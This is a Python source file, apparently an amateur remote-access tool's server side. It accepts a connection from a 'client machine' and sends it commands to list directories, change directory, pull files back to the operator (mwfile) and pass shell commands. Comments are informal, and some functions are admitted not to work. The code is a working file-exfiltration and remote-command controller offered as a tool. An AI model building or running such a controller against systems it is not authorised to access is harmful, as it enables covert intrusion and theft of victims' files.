import socket
import random
import time
import string
import os

#Commands List
commands_list_list = ["help","getcwd","mwfile","remotecmd"]
#

#Server_Settings

#

#Server Global Variables

server_bind_IPv4 = "192.168.100.3"
server_bind_Port = 6060
server_encoding = "utf-8"
server_binding_address = (server_bind_IPv4 , server_bind_Port)
desktop_info = socket.gethostname()
#

#Socket Settings
sock = socket.socket()
local_host_server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
local_host_server.bind(server_binding_address)
#



#Tools

def Convert(string): 
    li = list(string.split(",")) 
    return li 


def DisplayDirClearly(files,costum_dir):
    global current_dir
    location_count = 0
    files = Convert(files)

    while location_count < len(files):
        list_x = files[location_count]
        print(list_x)
        location_count += 1

#


#Console Commands
def commands_list():
	global commands_list_list


	print("Current Commands_")
	for command in commands_list_list:
		print(command)

	print("_------------")
	exit = input("Press any key to exit")


#//Gets the current file location from client machine
def get_cwd(args,connected_Device , address):
	connected_Device.send(args.encode())
	print("Command Sent To Client Machine")
	return_value = connected_Device.recv(1024).decode(server_encoding)
	print(return_value)


#// Changes Directory to the inputted one by the host machine$
def cd(args,connected_Device , address):
	connected_Device.send(args.encode())

	costum_path = str(input("Costum Dir: "))
	connected_Device.send(costum_path.encode())
	costum_path_resut = connected_Device.recv(1024).decode(server_encoding)
	DisplayDirClearly(costum_path_resut,costum_path)


#//Moves the file from client machine to host machine$
def mwfile(args,connected_Device , address):
	connected_Device.send(args.encode())

	file_path = str(input("Enter File Path: "))
	connected_Device.send(file_path.encode())
	data = connected_Device.recv(10000000)
	file_new_name = str(input("Enter the new filename: "))

	file_new = open(file_new_name ,"wb")
	file_new.write(data)
	file_new.close()

	print("")
	print("File Copied Successfully!")
#

#//This shit does not work cuz idk how to use SSH and i use this bs$
def shellaccess(args,connected_Device , address):
	connected_Device.send(args.encode())
	return_result_name  = connected_Device.recv(1024).decode(server_encoding)
	while True:
		shell_acces = input(f"{return_result_name}~$: ")
		if shell_acces == "exit":
			break
		else:
			connected_Device.send(shell_acces.encode())


#

#This basically just calls different functions i call it *THE SPLITTER*$
def command_manager(inline_command,connected_Device , address):
	if inline_command == "help":
		commands_list()
	if inline_command == "getcwd":
		os.system("CLS")
		get_cwd(inline_command,connected_Device , address)
	if inline_command == "cd":
		os.system("CLS")
		cd(inline_command,connected_Device , address)
	if inline_command == "mwfile":
		os.system("CLS")
		mwfile(inline_command,connected_Device , address)
	if inline_command == "shellaccess":
		shellaccess(inline_command,connected_Device , address)


#This just connects to the client machine
def Send_commands_to_Client(connected_Device , address):
	while True:
		command_line = input(f"{desktop_info}//>>: ")
		command_manager(command_line,connected_Device , address)



#And this listens to the incoming client connections, well lets say a connection* cause it only can handle one bruh kill me $
def Listen_to_connections():
	while True:
		local_host_server.listen()
		print("Waiting for incoming connections")
		connected_Device , address = local_host_server.accept()
		Send_commands_to_Client(connected_Device , address)



#i found this little guy few weeks ago let me tell you *A LIFE CHANGER* now i can call all the functions in my code and not just put function on the top of the other function to call the top function from bottom function cause the bottom function does not get called cause thats how python works pls kill me thanks for listening <3

if __name__ == '__main__':
	Listen_to_connections()